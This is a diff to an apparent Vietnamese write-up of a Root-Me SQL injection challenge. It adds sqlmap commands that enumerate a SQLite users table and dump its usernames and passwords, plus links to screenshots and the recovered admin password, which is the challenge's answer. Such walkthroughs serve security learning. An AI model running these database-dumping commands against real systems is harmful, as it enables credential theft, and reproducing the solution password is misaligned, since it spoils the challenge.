@@ -413,7 +413,17 @@ Payload tìm columns:
 
 > sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch10/' --dbms=SQLite --data='username=x&password=x' -T users --columns --threads=10 --batch 
 
+Ta được columns trả về:
 
+![image](https://user-images.githubusercontent.com/104350480/221763974-27ef2b87-6ec9-4155-8aad-15c7143aad94.png)
 
+Dump data thôi: 
 
+> payload: sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch10/' --dbms=SQLite --data='username=x&password=x' -T users -C username,password --dump --threads=10 --batch
+
+![image](https://user-images.githubusercontent.com/104350480/221770641-c3952d14-d1ca-415d-81ae-39988e8f2c2d.png)
+
+Ta cũng được password của admin
+
+> Pass: e2azO93i 
 
